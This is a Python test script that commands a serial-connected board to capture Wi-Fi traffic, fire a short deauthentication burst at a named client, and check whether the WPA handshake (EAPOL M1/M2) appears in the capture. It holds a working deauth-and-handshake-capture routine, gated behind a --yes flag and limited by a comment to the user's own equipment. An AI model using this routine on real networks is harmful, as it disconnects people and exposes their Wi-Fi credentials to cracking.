#!/usr/bin/env python3
"""Does one deauth cause the re-association handshake to land in the capture?

Exercises the whole wardrive loop on real air, in the order it runs:

    wardrive_start -> capture -> pick a real client -> deauth_now -> keep capturing
                                                                -> EAPOL M1/M2?

Writes two dumps so before and after are separable:
    <out>.pre.json   chunks captured before any deauth
    <out>.post.json  chunks captured from the deauth onward

Feed both through the node ingest and the difference is the answer. No EAPOL in
post.json means the deauth produced no re-association — information, not a
script failure.

It does NOT assume the board is listening. Opening the serial port can reset the
board, so this pings until it answers and confirms `ward_running` before it
claims to be capturing. A run that silently commands a board which never started
is worse than no run: it reports "no handshake" when the truth is "no capture".

THIS TRANSMITS. It fires a short deauth burst at a station you name, which
briefly disconnects that station, so it refuses to run without --yes.
"""
import json
import struct
import sys
import time

import serial

MAGIC = b"\xad\xde"
T_CMD, T_RESP, T_PCAP_CONT = 1, 2, 0x07

buf = bytearray()


def send(port, tid, cmd, args=None):
    body = json.dumps({"cmd": cmd, "args": args} if args else {"cmd": cmd}).encode()
    port.write(MAGIC + bytes([T_CMD, tid]) + struct.pack("<I", len(body)) + body)
    port.flush()


def pump(port, seconds, sink=None):
    """Read for `seconds`, reassembling frames. Returns [(ftype, payload), ...].

    Appends 0x07 payload hex to `sink` if given — that is the capture.
    """
    end = time.time() + seconds
    while time.time() < end:
        data = port.read(4096)
        if data:
            buf.extend(data)
    out = []
    while True:
        i = buf.find(MAGIC)
        if i < 0:
            buf.clear()
            break
        if i:
            del buf[:i]
        if len(buf) < 8:
            break
        ftype, fid = buf[2], buf[3]
        (length,) = struct.unpack("<I", bytes(buf[4:8]))
        if len(buf) < 8 + length:
            break
        payload = bytes(buf[8:8 + length])
        del buf[:8 + length]
        out.append((ftype, payload))
        if sink is not None and ftype == T_PCAP_CONT:
            sink.append(payload.hex())
    return out


def show(frames, limit=160):
    for ftype, p in frames:
        if ftype == T_RESP:
            print("  resp:", p.decode("utf-8", "replace")[:limit])


def wait_ready(port, timeout=15.0):
    """Ping until the board answers. Opening the port can reset it."""
    end = time.time() + timeout
    tid = 1
    while time.time() < end:
        send(port, tid, "ping"); tid += 1
        if any(t == T_RESP for t, _ in pump(port, 0.6)):
            return True
    return False


def capturing(port, tid):
    """Ask the board whether it is capturing. Returns (bool, reply_text)."""
    send(port, tid, "get_segment")
    for t, p in pump(port, 0.9):
        if t == T_RESP:
            text = p.decode("utf-8", "replace")
            return ("not capturing" not in text and '"sent"' in text), text
    return False, "(no reply)"


def start_wardrive(port, tid, channel=6, attempts=3):
    for n in range(attempts):
        send(port, tid, "wardrive_start", {"channel": channel}); tid += 1
        print(f"  wardrive_start attempt {n + 1}:")
        show(pump(port, 1.0))
        ok, text = capturing(port, tid); tid += 1
        if ok:
            print(f"  capturing confirmed ({text[:60]})")
            return True, tid
        print(f"  not capturing yet ({text[:80]})")
        time.sleep(1.0)
    return False, tid


def main():
    args = sys.argv[1:]
    if "--yes" not in args:
        print("refuses to transmit without --yes")
        return 2
    args.remove("--yes")
    port_path = args[0] if len(args) > 0 else "/dev/ttyACM0"
    out = args[1] if len(args) > 1 else "/tmp/wardrive-deauth"
    # Placeholder targets. Pass the real ones on the command line: this fires a deauth
    # at a specific station, and only your own gear on your own channel is a target.
    bssid = args[2] if len(args) > 2 else "9c:8b:76:80:32:97"
    clients = args[3].split(",") if len(args) > 3 else ["de:ad:be:ef:00:03"]
    pre_s = float(args[4]) if len(args) > 4 else 6.0
    post_s = float(args[5]) if len(args) > 5 else 25.0

    port = serial.Serial(port_path, 115200, timeout=0.1)
    time.sleep(2.5)
    if not wait_ready(port):
        print("board never answered a ping — aborting rather than commanding a dead link")
        return 3
    print("board is answering")

    ok, tid = start_wardrive(port, 20)
    if not ok:
        print("could not get the board into capturing state — aborting")
        return 4

    print(f"baseline {pre_s:.0f}s …")
    pre = []
    next_poll = 0.0
    deadline = time.time() + pre_s
    while time.time() < deadline:
        if time.time() >= next_poll:
            send(port, tid, "get_segment"); tid += 1; next_poll = time.time() + 0.25
        pump(port, 0.05, pre)
    print(f"baseline chunks: {len(pre)}")

    # ── the transmitting part ────────────────────────────────────────────────
    for c in clients:
        print(f"deauth_now bssid={bssid.replace(':', '')} client={c.replace(':', '')} count=5")
        send(port, tid, "deauth_now", {
            "bssid": bssid.replace(":", ""), "client": c.replace(":", ""),
            "count": 5, "interval_ms": 100,
        })
        tid += 1
        show(pump(port, 0.8))
        time.sleep(0.4)

    print(f"collecting {post_s:.0f}s after the deauth …")
    post = []
    next_poll = 0.0
    deadline = time.time() + post_s
    while time.time() < deadline:
        if time.time() >= next_poll:
            send(port, tid, "get_segment"); tid += 1; next_poll = time.time() + 0.25
        pump(port, 0.05, post)

    send(port, tid, "wardrive_stop")
    show(pump(port, 1.0))

    json.dump(pre, open(out + ".pre.json", "w"))
    json.dump(post, open(out + ".post.json", "w"))
    print(f"wrote {out}.pre.json ({len(pre)}) and {out}.post.json ({len(post)})")
    return 0


if __name__ == "__main__":
    sys.exit(main())
